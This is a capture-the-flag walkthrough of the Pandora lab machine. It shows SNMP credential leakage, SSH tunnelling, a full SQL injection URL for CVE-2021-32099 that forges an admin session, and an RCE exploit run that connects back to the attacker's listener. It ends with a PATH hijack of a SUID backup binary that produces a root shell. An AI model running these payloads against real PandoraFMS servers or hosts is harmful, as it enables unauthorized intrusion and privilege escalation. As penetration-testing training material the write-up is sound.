Pandora is an easy Linux box, though it plays a bit harder than most easies. The foothold comes from SNMP: the `public` community string leaks a process running with cleartext credentials, which get me an SSH session as a low-priv user. From there I find an internal PandoraFMS instance bound to localhost, forward it out over SSH, and abuse an unauthenticated SQL injection (CVE-2021-32099) to forge an admin session. Authenticated RCE lands me as `matt`, and a SUID backup binary that calls `tar` by its bare name lets me hijack `PATH` for root.

## Recon

### nmap

I start with a full TCP scan:

```
chickenprophecy@pwn$ nmap -p- --min-rate 10000 -sC -sV 10.129.63.22 -oN pandora.txt

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache/2.4.41 (Ubuntu)
```

Just SSH and Apache. The web root is a static "PLAY" landing page that calls itself an extension of Panda.HTB, but clicking around gives me nothing useful.

![PLAY landing]({{ '/assets/img/pandora/02-play-landing.png' | relative_url }})

Two open TCP ports on an easy box with a dead website usually means I'm missing something on UDP.

### UDP

```
chickenprophecy@pwn$ sudo nmap -sU -F 10.129.63.22

PORT    STATE SERVICE
161/udp open  snmp
```

Port 161 is open — SNMP. That's the way in.

## SNMP → daniel

SNMP exposes device data as queryable OIDs, and admins often leave the default `public` community string in place. I walk it:

```
chickenprophecy@pwn$ snmpwalk -v2c -c public 10.129.63.22
```

Buried in the output, one of the running processes has its credentials passed in cleartext on the command line:

```
iso.3.6.1.2.1.25.4.2.1.5.1106 = STRING: "-u daniel -p HotelBabylon23"
```

That's a username and password. They work over SSH:

```
chickenprophecy@pwn$ ssh daniel@10.129.63.22
daniel@10.129.63.22's password:

daniel@pandora:~$ id
uid=1001(daniel) gid=1001(daniel) groups=1001(daniel)
```

### Local enumeration

There's a second user, `matt`, and the user flag lives in his home directory where I can't read it yet:

```
daniel@pandora:~$ ls -la /home
drwxr-xr-x  4 daniel daniel 4096 Sep 27 13:54 daniel
drwxr-xr-x  5 matt   matt   4096 Sep 27 15:34 matt

daniel@pandora:~$ cat /home/matt/user.txt
cat: /home/matt/user.txt: Permission denied
```

So I need to become `matt`.

## The internal PandoraFMS site

Looking at what Apache serves, there are two web roots:

```
daniel@pandora:~$ ls -la /var/www
drwxr-xr-x  3 root root 4096 Dec  7  2021 html
drwxr-xr-x  3 matt matt 4096 Dec  7  2021 pandora
```

`html` is owned by root — that's the PLAY page I already saw. `pandora` is owned by `matt`, and I haven't seen that one. The Apache config tells me why:

```
daniel@pandora:~$ cat /etc/apache2/sites-enabled/pandora.conf
<VirtualHost localhost:80>
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
</VirtualHost>
```

Two things stand out. The vhost is bound to `localhost:80`, so it's only reachable from the box itself — which is why I never saw it externally. And `AssignUserID matt matt` means it runs as `matt`, so code execution against it lands me as the user I need.

## Port forwarding

To reach a localhost-only service, I forward it back to my box over SSH:

```
chickenprophecy@pwn$ ssh daniel@10.129.63.22 -N -L 8080:127.0.0.1:80
```

Now `http://localhost:8080` on my machine hits the box's internal port 80, and I get the PandoraFMS login page.

![PandoraFMS login]({{ '/assets/img/pandora/03-pandorafms-login.png' | relative_url }})

The version is printed at the bottom of the page:

```
v7.0NG.742_FIX_PERL2020
```

Default credentials don't work.

## PandoraFMS → matt

### Finding the SQL injection

`searchsploit` only turns up exploits that need authentication:

```
chickenprophecy@pwn$ searchsploit pandora
```

I don't have creds yet, so those are useless. Searching the web for the exact version instead turns up **CVE-2021-32099** — an unauthenticated SQL injection in `chart_generator.php` through the `session_id` parameter. The bug lets me forge a valid admin session.

I hit the endpoint through my tunnel with a UNION payload that returns a session whose data says I'm `admin`:

```
http://localhost:8080/pandora_console/include/chart_generator.php?session_id=a' UNION SELECT 'a',1,'id_usuario|s:5:"admin";'-- -
```

Then I refresh the console, and I'm in as `admin`.

![admin panel]({{ '/assets/img/pandora/04-admin-panel.png' | relative_url }})

From the panel I reset the admin password so I have a stable login of `admin:admin`.

### Authenticated RCE

With admin access, an authenticated RCE (EDB 50961) gets me a shell. I mirror the exploit and point it at the box through my tunnel, with a listener waiting:

```
chickenprophecy@pwn$ sudo penelope -p 9001

chickenprophecy@pwn$ searchsploit -m 50961
chickenprophecy@pwn$ python3 50961.py -t 127.0.0.1 8080 -u admin admin -s 10.10.15.179 9001
```

The exploit fires and the box connects back:

```
matt@pandora:/var/www/pandora/pandora_console$ id
uid=1000(matt) gid=1000(matt) groups=1000(matt)
```

I upgrade to a proper TTY and grab the user flag:

```
matt@pandora:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
matt@pandora:~$ cat /home/matt/user.txt
[user flag]
```

## Privilege escalation → root

### A suspicious SUID binary

I look for SUID binaries:

```
matt@pandora:~$ find / -perm -4000 -type f 2>/dev/null
...
/usr/bin/pandora_backup
```

`pandora_backup` isn't standard:

```
matt@pandora:~$ ls -l /usr/bin/pandora_backup
-rwsr-x--- 1 root matt 16816 Dec  3  2021 /usr/bin/pandora_backup
```

It's owned by root with the SUID bit set, and only the `matt` group can run it — so it executes as root when I run it.

### Reading the binary

`strings` isn't installed on the box, so I fake it with tools that are:

```
matt@pandora:~$ cat /usr/bin/pandora_backup | tr -c '[:print:]' '\n' | grep -E '.{4,}'
...
tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*
```

The important detail: it calls `tar` by its bare name, not `/usr/bin/tar`. Since the binary runs as root and lets the shell resolve `tar` through `PATH`, I can put my own `tar` earlier in `PATH` and have it run as root.

### PATH hijack

I want a `tar` that copies bash into a root-owned SUID shell. This only works reliably from a clean login shell, so I first add my key to `matt` and log back in properly rather than fighting the RCE shell:

```
chickenprophecy@pwn$ ssh-keygen -t ed25519 -f ./matt_key
matt@pandora:~$ mkdir -p ~/.ssh && chmod 700 ~/.ssh
matt@pandora:~$ curl http://10.10.15.179:8001/matt_key.pub -o ~/.ssh/authorized_keys
matt@pandora:~$ chmod 600 ~/.ssh/authorized_keys

chickenprophecy@pwn$ ssh matt@10.129.63.22 -i matt_key
```

In the clean shell, I plant the fake `tar`, put my directory first in `PATH`, and run the backup:

```
matt@pandora:~$ cat > /home/matt/tar <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
matt@pandora:~$ chmod +x /home/matt/tar
matt@pandora:~$ export PATH=/home/matt:$PATH
matt@pandora:~$ which tar
/home/matt/tar
matt@pandora:~$ /usr/bin/pandora_backup
```

One thing to watch: if the backup prints `Backup successful!`, the real `tar` ran and the hijack failed. When my `tar` wins, that line never shows. Now `/tmp/rootbash` is a root-owned SUID shell:

```
matt@pandora:~$ /tmp/rootbash -p
rootbash-5.0# id
uid=1000(matt) gid=1000(matt) euid=0(root) egid=0(root) groups=1000(matt)
rootbash-5.0# cat /root/root.txt
[root flag]
```

And that's root.
